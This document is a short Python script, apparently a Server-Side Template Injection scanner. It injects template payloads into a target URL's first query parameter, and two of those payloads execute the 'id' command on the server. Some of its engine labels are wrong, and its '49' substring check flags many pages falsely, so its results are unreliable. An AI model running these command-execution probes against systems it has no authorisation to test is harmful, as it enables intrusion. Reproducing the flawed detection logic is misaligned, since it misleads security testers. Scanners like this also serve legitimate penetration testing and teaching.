#!/usr/bin/env python3
"""
SSTI Scanner (Server-Side Template Injection)
Usage: python ssti_scanner.py https://target.com/template
"""

import sys
import requests
import urllib.parse

class SSTIScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # SSTI payloads
        self.payloads = [
            ('{{7*7}}', 'jinja2'),
            ('${7*7}', 'freemarker'),
            ('<%= 7*7 %>', 'erb'),
            ('#{7*7}', 'mako'),
            ('*{7*7}', 'thymeleaf'),
            ('{{7*\'7\'}}', 'jinja2'),
            ('{{config}}', 'jinja2'),
            ('{{request}}', 'jinja2'),
            ('<%= system("id") %>', 'erb'),
            ('${T(java.lang.Runtime).getRuntime().exec("id")}', 'freemarker'),
        ]
    
    def test_payload(self, payload, template):
        """Test SSTI"""
        try:
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for key in params:
                params[key] = [payload]
                break
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, timeout=10)
            
            # Check for SSTI response
            if '49' in r.text:
                return {'payload': payload, 'template': template, 'result': '49'}
            if '7777777' in r.text:
                return {'payload': payload, 'template': 'jinja2', 'result': '7777777'}
            if 'root:' in r.text or 'uid=' in r.text:
                return {'payload': payload, 'template': template, 'result': 'RCE'}
            
        except Exception as e:
            pass
        
        return None
    
    def scan(self):
        """Scan for SSTI"""
        print(f"[*] Scanning {self.url}...")
        
        for payload, template in self.payloads:
            result = self.test_payload(payload, template)
            if result:
                print(f"[!] SSTI ({template}): {payload}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python ssti_scanner.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = SSTIScanner(url)
    scanner.scan()


if __name__ == "__main__":
    main()